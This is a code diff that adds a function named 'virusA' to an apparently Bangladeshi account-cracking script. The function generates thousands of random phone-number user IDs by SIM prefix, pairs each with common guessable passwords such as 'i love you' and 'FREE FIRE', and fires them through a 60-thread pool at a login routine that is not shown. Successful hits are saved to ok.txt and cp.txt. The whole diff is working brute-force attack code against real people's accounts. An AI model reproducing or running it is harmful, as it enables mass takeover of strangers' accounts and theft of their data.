@@ -209,3 +209,36 @@ def admin():
 		admin()
 	if bal =='0':
 		Main()
+		
+def virusA():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" ┏━[•] BD SIM CODE 017 018 019 013 015 016]")
+	kode = input(' ┗━[+] SELECT : ')
+	doamin = ' BD NUMBER ID CLONER [ONLY-OK] '
+	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
+	limit = int(input(' ┗━[+] LIMIT : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=60) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('┏━[•] COUNTRY    : BANGLADESH')
+		print('┣━[•] TOTAL ID   :  '+tl)
+		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
+		print('\033[1;97m┗━[•] \033[1;92mSTART BD GAME ID CRACKING... ')
+		print(50*'━')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','Bangladesh','i hate you','i have you','বাংলাদেশ','freefireiloveyou']
+			yaari.submit(b,uid,pwx,tl)
+	print(50*'_')
+	print(' [✓] Crack process has been completed')
+	print(' [✓] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
